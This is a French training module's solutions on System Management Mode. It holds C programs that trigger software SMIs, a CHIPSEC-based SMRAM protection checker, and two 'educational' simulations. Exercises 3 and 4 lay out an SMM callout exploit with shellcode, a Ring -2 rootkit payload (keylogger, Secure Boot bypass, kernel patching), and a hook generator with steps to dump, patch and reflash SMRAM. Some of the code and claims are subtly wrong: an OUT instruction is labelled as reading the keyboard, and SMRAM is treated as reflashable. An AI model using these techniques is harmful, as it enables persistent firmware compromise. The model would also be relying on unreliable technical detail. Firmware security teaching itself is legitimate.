# Solutions - SMM Basics

## Exercice 1 : Déclencher un Software SMI (Très facile)

**Objectif** : Créer un programme qui déclenche un SMI via le port 0xB2.

### Solution

```c
/*
 * Déclencheur de Software SMI
 *
 * Compilation : gcc -o trigger_smi trigger_smi.c
 * Usage : sudo ./trigger_smi <code_smi>
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/io.h>

#define SMI_CMD_PORT 0xB2   // Port SMI Command
#define SMI_DATA_PORT 0xB3  // Port SMI Data

// Déclencher un SW SMI avec un code spécifique
int trigger_smi(uint8_t smi_code) {
    // Demander l'accès aux ports I/O
    if (ioperm(SMI_CMD_PORT, 2, 1) != 0) {
        perror("ioperm (root requis)");
        return -1;
    }

    printf("[*] Déclenchement du SW SMI 0x%02X...\n", smi_code);

    // Écrire le code SMI dans le port 0xB2
    outb(smi_code, SMI_CMD_PORT);

    printf("[+] SMI déclenché\n");
    printf("[*] Si le système a freezé brièvement, le SMI a été traité\n");

    // Libérer les permissions
    ioperm(SMI_CMD_PORT, 2, 0);

    return 0;
}

// Lister les codes SMI courants
void list_common_smi_codes() {
    printf("\n[*] Codes SMI courants :\n");
    printf("========================\n\n");
    printf("0x00 : NOP (généralement safe)\n");
    printf("0x42 : Test SMI handler\n");
    printf("0x50 : Power management\n");
    printf("0x80 : ACPI enable\n");
    printf("0x81 : ACPI disable\n");
    printf("0xA0 : Thermal management\n");
    printf("0xB0 : Software SMI custom\n");
    printf("\n");
    printf("[!] ATTENTION : Codes inconnus peuvent crasher le système\n");
    printf("    Utiliser uniquement sur une VM de test\n");
}

int main(int argc, char** argv) {
    if (getuid() != 0) {
        printf("[-] Ce programme nécessite les privilèges root\n");
        return 1;
    }

    printf("[*] Déclencheur de Software SMI\n");
    printf("[*] ============================\n\n");

    if (argc < 2) {
        printf("Usage: %s <code_smi>\n", argv[0]);
        printf("Exemple: %s 0x00\n\n", argv[0]);
        list_common_smi_codes();
        return 1;
    }

    // Parser le code SMI
    uint8_t smi_code = (uint8_t)strtol(argv[1], NULL, 16);

    printf("[*] Code SMI : 0x%02X\n", smi_code);

    if (smi_code != 0x00) {
        printf("\n[!] AVERTISSEMENT : Code SMI non standard\n");
        printf("    Ceci peut crasher le système si le handler n'existe pas\n");
        printf("    Recommandé : tester d'abord 0x00 (NOP)\n\n");
        printf("[?] Continuer ? (y/N) : ");

        char response;
        scanf(" %c", &response);

        if (response != 'y' && response != 'Y') {
            printf("[-] Annulé\n");
            return 0;
        }
    }

    // Déclencher le SMI
    if (trigger_smi(smi_code) != 0) {
        return 1;
    }

    printf("\n[+] Opération terminée\n");
    printf("\n[*] Pour observer les SMI :\n");
    printf("    - dmesg | grep -i smm\n");
    printf("    - Utiliser chipsec pour monitoring\n");

    return 0;
}
```

**Utilisation** :
```bash
# Tester avec code 0x00 (safe)
sudo ./trigger_smi 0x00

# Tester avec d'autres codes (risqué)
sudo ./trigger_smi 0x42
```

---

## Exercice 2 : Vérifier les protections SMRAM (Facile)

**Objectif** : Utiliser CHIPSEC pour vérifier que la SMRAM est protégée.

### Solution

```c
/*
 * Vérificateur de protections SMRAM
 *
 * Compilation : gcc -o check_smram check_smram.c
 * Usage : sudo ./check_smram
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/io.h>

// Vérifier CHIPSEC
int check_chipsec() {
    printf("[*] Vérification de CHIPSEC...\n");

    FILE* fp = popen("which chipsec_main 2>/dev/null", "r");
    if (!fp) {
        return -1;
    }

    char path[256] = {0};
    if (fgets(path, sizeof(path), fp) == NULL) {
        pclose(fp);
        return -1;
    }

    pclose(fp);

    if (strlen(path) > 0) {
        printf("[+] CHIPSEC trouvé : %s", path);
        return 0;
    }

    return -1;
}

// Installer CHIPSEC
void install_chipsec() {
    printf("\n[*] Installation de CHIPSEC\n");
    printf("============================\n\n");

    printf("Commandes d'installation :\n");
    printf("  git clone https://github.com/chipsec/chipsec.git\n");
    printf("  cd chipsec\n");
    printf("  sudo python setup.py install\n");
    printf("\nOu via pip :\n");
    printf("  sudo pip install chipsec\n");
}

// Vérifier SMRR avec CHIPSEC
int check_smrr() {
    printf("\n[*] Vérification SMRR (SMM Range Registers)\n");
    printf("============================================\n\n");

    FILE* fp = popen("chipsec_main -m common.smrr 2>&1", "r");
    if (!fp) {
        printf("[-] Impossible d'exécuter chipsec_main\n");
        return -1;
    }

    char buffer[512];
    int smrr_enabled = 0;
    int smrr_base = 0;
    int smrr_mask = 0;

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("%s", buffer);

        if (strstr(buffer, "SMRR range protection is enabled")) {
            smrr_enabled = 1;
        }
        if (strstr(buffer, "SMRR_PHYS_BASE")) {
            sscanf(buffer, "%*[^=] = %x", &smrr_base);
        }
        if (strstr(buffer, "SMRR_PHYS_MASK")) {
            sscanf(buffer, "%*[^=] = %x", &smrr_mask);
        }
    }

    pclose(fp);

    printf("\n[*] Résultat :\n");
    if (smrr_enabled) {
        printf("    [+] SMRR ACTIVÉ (système protégé)\n");
        printf("    [+] Base  : 0x%08X\n", smrr_base);
        printf("    [+] Mask  : 0x%08X\n", smrr_mask);
    } else {
        printf("    [!] SMRR DÉSACTIVÉ (vulnérable)\n");
        printf("    [!] La SMRAM peut être accessible depuis l'OS\n");
    }

    return smrr_enabled ? 0 : 1;
}

// Vérifier le lock SMRAM
int check_smram_lock() {
    printf("\n[*] Vérification SMRAM Lock (D_LCK)\n");
    printf("====================================\n\n");

    FILE* fp = popen("chipsec_main -m common.smm 2>&1", "r");
    if (!fp) {
        printf("[-] Impossible d'exécuter chipsec_main\n");
        return -1;
    }

    char buffer[512];
    int dlck_set = 0;

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("%s", buffer);

        if (strstr(buffer, "D_LCK is set")) {
            dlck_set = 1;
        }
    }

    pclose(fp);

    printf("\n[*] Résultat :\n");
    if (dlck_set) {
        printf("    [+] D_LCK ACTIVÉ (configuration verrouillée)\n");
        printf("    [+] SMRAM ne peut plus être reconfigurée\n");
    } else {
        printf("    [!] D_LCK NON ACTIVÉ (vulnérable)\n");
        printf("    [!] Un attaquant peut reconfigurer la SMRAM\n");
    }

    return dlck_set ? 0 : 1;
}

// Vérifier les call-outs SMI
int check_smi_callouts() {
    printf("\n[*] Vérification SMM Call-Out Vulnerabilities\n");
    printf("==============================================\n\n");

    printf("[*] Scan des SMI handlers pour call-outs...\n");
    printf("    (Ceci peut prendre plusieurs minutes)\n\n");

    FILE* fp = popen("chipsec_main -m common.smm_code_chk 2>&1", "r");
    if (!fp) {
        printf("[-] Impossible d'exécuter chipsec_main\n");
        return -1;
    }

    char buffer[512];
    int vulnerable = 0;

    while (fgets(buffer, sizeof(buffer), fp)) {
        printf("%s", buffer);

        if (strstr(buffer, "call-out") || strstr(buffer, "vulnerability")) {
            vulnerable = 1;
        }
    }

    pclose(fp);

    printf("\n[*] Résultat :\n");
    if (!vulnerable) {
        printf("    [+] Aucune vulnérabilité call-out détectée\n");
    } else {
        printf("    [!] VULNÉRABILITÉ CALL-OUT DÉTECTÉE\n");
        printf("    [!] Un SMI handler appelle du code hors SMRAM\n");
        printf("    [!] Exploitation possible en Ring -2\n");
    }

    return vulnerable ? 1 : 0;
}

int main() {
    if (getuid() != 0) {
        printf("[-] Ce programme nécessite les privilèges root\n");
        return 1;
    }

    printf("[*] Vérificateur de protections SMRAM\n");
    printf("[*] ==================================\n\n");

    // Vérifier CHIPSEC
    if (check_chipsec() != 0) {
        printf("[-] CHIPSEC non trouvé\n");
        install_chipsec();
        return 1;
    }

    // Tests de sécurité
    int smrr_ok = (check_smrr() == 0);
    int lock_ok = (check_smram_lock() == 0);
    int callout_ok = (check_smi_callouts() == 0);

    // Résumé
    printf("\n[*] Résumé de sécurité SMM\n");
    printf("==========================\n\n");

    int score = 0;
    if (smrr_ok) score++;
    if (lock_ok) score++;
    if (callout_ok) score++;

    printf("Protections actives : %d/3\n\n", score);

    if (score == 3) {
        printf("[+] EXCELLENT : Toutes les protections SMM sont actives\n");
        printf("    Le système est bien protégé contre les attaques SMM\n");
    } else if (score >= 2) {
        printf("[!] MOYEN : Certaines protections manquent\n");
        printf("    Risque modéré d'exploitation SMM\n");
    } else {
        printf("[!!!] CRITIQUE : Protections SMM insuffisantes\n");
        printf("      Le système est vulnérable aux attaques Ring -2\n");
        printf("\n      Actions recommandées :\n");
        printf("      1. Mettre à jour le firmware UEFI/BIOS\n");
        printf("      2. Activer SMRR dans le BIOS si disponible\n");
        printf("      3. Vérifier avec le vendor pour patchs de sécurité\n");
    }

    return (score == 3) ? 0 : 1;
}
```

---

## Exercice 3 : Simuler une attaque SMM Callout (Moyen)

**Objectif** : Démontrer comment un SMI handler vulnérable peut être exploité.

### Solution

```c
/*
 * Simulation d'exploitation SMM Call-Out
 *
 * ATTENTION : Démonstration conceptuelle uniquement !
 * L'exploitation réelle nécessite un bug firmware.
 *
 * Compilation : gcc -o smm_callout_exploit smm_callout_exploit.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/io.h>

// Pseudo-code d'un SMI handler vulnérable (firmware)
void vulnerable_smi_handler_example() {
    printf("\n[*] Exemple de SMI Handler vulnérable (pseudo-code)\n");
    printf("====================================================\n\n");

    printf("Code firmware (s'exécute en SMRAM, Ring -2) :\n\n");
    printf("void SmiHandler(SMI_CONTEXT* context) {\n");
    printf("    // Vulnérabilité : appelle une fonction via pointeur utilisateur\n");
    printf("    void (*callback)(void) = (void(*)(void))context->user_param;\n");
    printf("\n");
    printf("    if (callback != NULL) {\n");
    printf("        callback();  // ← CALLOUT vulnérable !\n");
    printf("    }\n");
    printf("}\n\n");

    printf("Problème :\n");
    printf("  Si l'attaquant contrôle context->user_param, il peut faire\n");
    printf("  exécuter son code en mode SMM (Ring -2) !\n");
}

// Simulation de l'exploitation
void simulate_exploit() {
    printf("\n[*] Simulation d'exploitation\n");
    printf("==============================\n\n");

    printf("Étape 1 : Préparer le shellcode en mémoire OS\n");
    printf("----------------------------------------------\n");
    printf("unsigned char shellcode[] = {\n");
    printf("    0x90, 0x90, 0x90,  // NOP sled\n");
    printf("    // Code malveillant ici (Ring -2 !) \n");
    printf("    0xC3               // RET\n");
    printf("};\n\n");

    printf("void* shellcode_addr = mmap(0x1000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,\n");
    printf("                            MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);\n");
    printf("memcpy(shellcode_addr, shellcode, sizeof(shellcode));\n\n");

    printf("Étape 2 : Configurer le paramètre SMI\n");
    printf("--------------------------------------\n");
    printf("SMI_CONTEXT context;\n");
    printf("context.user_param = (uint64_t)shellcode_addr;  // Pointeur vers shellcode\n\n");

    printf("Étape 3 : Déclencher le SW SMI\n");
    printf("------------------------------\n");
    printf("// Écrire le contexte dans une zone connue du SMI handler\n");
    printf("write_to_smm_comm_buffer(&context, sizeof(context));\n\n");
    printf("// Déclencher le SMI\n");
    printf("outb(0x42, 0xB2);  // Code SMI vulnérable\n\n");

    printf("Étape 4 : Exécution\n");
    printf("-------------------\n");
    printf("1. CPU entre en mode SMM\n");
    printf("2. SmiHandler() lit context.user_param\n");
    printf("3. Appelle la fonction à cette adresse\n");
    printf("4. → Shellcode s'exécute en Ring -2 !\n");
    printf("5. Accès total : SMRAM, hardware, mémoire kernel\n\n");

    printf("Résultat : Rootkit Ring -2 installé\n");
}

// Payload d'exemple (ce qui serait exécuté en SMM)
void example_smm_payload() {
    printf("\n[*] Exemple de payload SMM (ce qui s'exécuterait en Ring -2)\n");
    printf("=============================================================\n\n");

    printf("// S'exécute en mode SMM\n");
    printf("void smm_rootkit_payload() {\n");
    printf("    // 1. Accès direct à la SMRAM\n");
    printf("    volatile uint8_t* smram = (uint8_t*)0xFED00000;\n");
    printf("\n");
    printf("    // 2. Installer un hook persistant dans un SMI handler\n");
    printf("    void* original_handler = find_smi_handler(0x00);\n");
    printf("    uint8_t hook[] = {0xE9, /* JMP offset */};\n");
    printf("    memcpy(original_handler, hook, sizeof(hook));\n");
    printf("\n");
    printf("    // 3. Keylogger hardware-level\n");
    printf("    uint8_t scancode = inb(0x60);  // Lire clavier\n");
    printf("    smram_log_buffer[log_index++] = scancode;\n");
    printf("\n");
    printf("    // 4. Contourner Secure Boot\n");
    printf("    patch_secure_boot_verification();\n");
    printf("\n");
    printf("    // 5. Persistance maximale\n");
    printf("    // Survit à : reboot OS, formatage, réinstallation\n");
    printf("}\n\n");
}

// Mitigation
void explain_mitigations() {
    printf("\n[*] Mitigations contre les call-outs SMM\n");
    printf("=========================================\n\n");

    printf("1. Code Review du firmware\n");
    printf("   - Vérifier que TOUS les appels restent dans SMRAM\n");
    printf("   - Bannir les pointeurs de fonction utilisateur\n");
    printf("   - Validation stricte de toutes les entrées\n\n");

    printf("2. SMRR (SMM Range Registers)\n");
    printf("   - Protège la SMRAM contre les accès non-SMM\n");
    printf("   - Empêche la lecture/écriture du code SMI depuis l'OS\n\n");

    printf("3. D_LCK (SMRAM Lock)\n");
    printf("   - Verrouille la configuration SMRAM au boot\n");
    printf("   - Empêche la reconfiguration malveillante\n\n");

    printf("4. Code Scanning automatisé\n");
    printf("   - CHIPSEC : chipsec_main -m common.smm_code_chk\n");
    printf("   - Détecte les call-outs dans les binaires SMM\n\n");

    printf("5. Audits réguliers\n");
    printf("   - Reverse engineering des SMI handlers\n");
    printf("   - Fuzzing des interfaces SMI\n");
}

int main() {
    printf("[*] Simulateur d'exploitation SMM Call-Out\n");
    printf("[*] ========================================\n");

    printf("\n[!] AVERTISSEMENT\n");
    printf("=================\n");
    printf("Ceci est une DÉMONSTRATION ÉDUCATIVE\n");
    printf("L'exploitation réelle nécessite :\n");
    printf("  - Un bug firmware spécifique\n");
    printf("  - Accès root sur la machine cible\n");
    printf("  - Connaissance précise de l'implémentation SMM\n\n");

    // Montrer le code vulnérable
    vulnerable_smi_handler_example();

    // Simulation
    simulate_exploit();

    // Payload
    example_smm_payload();

    // Mitigations
    explain_mitigations();

    printf("\n[*] Fin de la démonstration\n");

    return 0;
}
```

---

## Exercice 4 : Créer un hook SMI basique (Difficile)

**Objectif** : Simuler l'installation d'un hook dans un SMI handler.

### Solution

```c
/*
 * Simulateur de hook SMI (conceptuel)
 *
 * NOTE : Ceci est purement théorique et ne peut s'exécuter
 * qu'avec accès direct à la SMRAM (exploit ou hardware)
 *
 * Compilation : gcc -o smi_hook_simulator smi_hook_simulator.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define SMRAM_BASE 0xFED00000
#define SMRAM_SIZE 0x200000  // 2 MB

// Simuler la structure d'un SMI handler
typedef struct {
    uint64_t entry_point;
    uint64_t stack_pointer;
    uint8_t  code[256];
} __attribute__((packed)) SMIHandler;

// Générer le code du hook (assembleur x86-64)
void generate_hook_code(uint8_t* buffer, uint64_t original_handler) {
    printf("[*] Génération du code du hook SMI...\n");

    int offset = 0;

    // PUSH tous les registres (sauvegarder le contexte)
    uint8_t push_all[] = {
        0x50,                   // PUSH RAX
        0x51,                   // PUSH RCX
        0x52,                   // PUSH RDX
        0x53,                   // PUSH RBX
        0x55,                   // PUSH RBP
        0x56,                   // PUSH RSI
        0x57                    // PUSH RDI
    };
    memcpy(buffer + offset, push_all, sizeof(push_all));
    offset += sizeof(push_all);

    // Code malveillant (exemple : lire le port clavier)
    uint8_t malicious_code[] = {
        0xB0, 0x60,             // MOV AL, 0x60
        0xE6, 0x60,             // OUT 0x60, AL (lire scancode)
        // ... logger dans SMRAM ...
    };
    memcpy(buffer + offset, malicious_code, sizeof(malicious_code));
    offset += sizeof(malicious_code);

    // POP tous les registres (restaurer le contexte)
    uint8_t pop_all[] = {
        0x5F,                   // POP RDI
        0x5E,                   // POP RSI
        0x5D,                   // POP RBP
        0x5B,                   // POP RBX
        0x5A,                   // POP RDX
        0x59,                   // POP RCX
        0x58                    // POP RAX
    };
    memcpy(buffer + offset, pop_all, sizeof(pop_all));
    offset += sizeof(pop_all);

    // JMP vers le handler original
    buffer[offset++] = 0xE9;  // JMP rel32

    uint32_t jmp_offset = (uint32_t)(original_handler - (SMRAM_BASE + offset + 4));
    memcpy(buffer + offset, &jmp_offset, 4);
    offset += 4;

    printf("[+] Hook généré : %d bytes\n", offset);
}

// Simuler l'installation du hook
void simulate_hook_installation() {
    printf("\n[*] Simulation d'installation de hook SMI\n");
    printf("==========================================\n\n");

    printf("Prérequis :\n");
    printf("  1. Accès à la SMRAM (via exploit ou programmeur hardware)\n");
    printf("  2. Connaissance de l'offset du SMI handler cible\n");
    printf("  3. SMRR désactivé OU bypass de SMRR\n\n");

    // Étape 1 : Dumper la SMRAM
    printf("Étape 1 : Dumper la SMRAM\n");
    printf("-------------------------\n");
    printf("// Via exploit kernel ou CHIPSEC\n");
    printf("chipsec_util smram dump -f smram.bin\n\n");

    // Étape 2 : Trouver le SMI handler
    printf("Étape 2 : Reverse engineering du SMI handler\n");
    printf("--------------------------------------------\n");
    printf("// Charger smram.bin dans IDA Pro / Ghidra\n");
    printf("// Chercher le dispatcher SMI\n");
    printf("// Identifier le handler pour le code 0x00 (exemple)\n");
    printf("uint64_t handler_offset = 0xFED12000;  // Exemple\n\n");

    // Étape 3 : Générer le hook
    printf("Étape 3 : Générer le code du hook\n");
    printf("----------------------------------\n");
    uint8_t hook_code[256];
    generate_hook_code(hook_code, SMRAM_BASE + 0x12000);

    printf("\nCode du hook (hex) :\n");
    for (int i = 0; i < 50; i++) {  // Afficher les 50 premiers bytes
        printf("%02X ", hook_code[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("...\n\n");

    // Étape 4 : Patcher la SMRAM
    printf("Étape 4 : Patcher la SMRAM dumpée\n");
    printf("----------------------------------\n");
    printf("// Ouvrir smram.bin en écriture\n");
    printf("FILE* f = fopen(\"smram.bin\", \"r+b\");\n");
    printf("fseek(f, 0x12000, SEEK_SET);  // Offset du handler\n");
    printf("fwrite(hook_code, 1, sizeof(hook_code), f);\n");
    printf("fclose(f);\n\n");

    // Étape 5 : Reflasher
    printf("Étape 5 : Reflasher la SMRAM modifiée\n");
    printf("--------------------------------------\n");
    printf("// Via programmeur hardware ou exploit\n");
    printf("// EXTRÊMEMENT DANGEREUX : backup obligatoire\n");
    printf("chipsec_util smram write -f smram.bin\n\n");

    // Étape 6 : Vérification
    printf("Étape 6 : Vérification post-reboot\n");
    printf("----------------------------------\n");
    printf("// Déclencher le SMI hookés\n");
    printf("outb(0x00, 0xB2);\n");
    printf("// → Le hook s'exécute en Ring -2\n");
    printf("// → Keylogger actif, invisible de l'OS\n\n");
}

// Démonstration de payload SMM
void demonstrate_smm_payload() {
    printf("\n[*] Exemples de payloads SMM\n");
    printf("=============================\n\n");

    printf("1. Keylogger hardware-level\n");
    printf("---------------------------\n");
    printf("void smm_keylogger() {\n");
    printf("    uint8_t scancode = inb(0x60);\n");
    printf("    static uint8_t log_buffer[4096];\n");
    printf("    static int index = 0;\n");
    printf("    log_buffer[index++] = scancode;\n");
    printf("    // Exfiltration via DMA, réseau, etc.\n");
    printf("}\n\n");

    printf("2. Contournement Secure Boot\n");
    printf("----------------------------\n");
    printf("void smm_bypass_secureboot() {\n");
    printf("    // Patcher la fonction de vérification de signature\n");
    printf("    void* verify_func = find_signature_check();\n");
    printf("    uint8_t patch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}; // MOV EAX,0; RET\n");
    printf("    memcpy(verify_func, patch, sizeof(patch));\n");
    printf("}\n\n");

    printf("3. Manipulation mémoire kernel\n");
    printf("------------------------------\n");
    printf("void smm_kernel_patch() {\n");
    printf("    // Accès direct à la mémoire kernel\n");
    printf("    uint64_t kernel_base = find_kernel_base();\n");
    printf("    // Patcher sys_call_table, etc.\n");
    printf("}\n\n");
}

int main() {
    printf("[*] Simulateur de hook SMI\n");
    printf("[*] ======================\n\n");

    printf("[!] AVERTISSEMENT ÉDUCATIF\n");
    printf("==========================\n");
    printf("Ce code est purement THÉORIQUE et ÉDUCATIF.\n");
    printf("L'installation d'un hook SMM réel nécessite :\n");
    printf("  - Accès physique à la machine\n");
    printf("  - Programmeur hardware (SPI flash)\n");
    printf("  - OU exploit kernel + désactivation SMRR\n");
    printf("  - Connaissance approfondie du firmware\n\n");
    printf("NE JAMAIS tenter sur un système de production !\n");
    printf("Risque de BRICK permanent de la carte mère.\n\n");

    // Simulation
    simulate_hook_installation();

    // Payloads
    demonstrate_smm_payload();

    printf("\n[*] Conclusion\n");
    printf("==============\n\n");
    printf("Les hooks SMM offrent :\n");
    printf("  + Persistance maximale (survit à tout)\n");
    printf("  + Invisibilité totale (Ring -2, hors scope OS)\n");
    printf("  + Accès complet (SMRAM, hardware, kernel)\n\n");
    printf("Mais nécessitent :\n");
    printf("  - Accès firmware (exploit ou hardware)\n");
    printf("  - Expertise technique élevée\n");
    printf("  - Grand risque (brick de carte mère)\n\n");

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu peux :

- [x] Expliquer le SMM et les rings de protection (-3, -2, -1, 0, 3)
- [x] Déclencher un Software SMI via le port 0xB2
- [x] Vérifier les protections SMRAM (SMRR, D_LCK) avec CHIPSEC
- [x] Comprendre les vulnérabilités SMM (call-outs, buffer overflow)
- [x] Analyser un SMI handler avec IDA Pro / Ghidra
- [x] Expliquer la persistance Ring -2 (SMM rootkit)

**Module suivant** : [A11 - Side Channel Intro](../../PHASE_A03_HARDWARE/A11_side_channel_intro/)
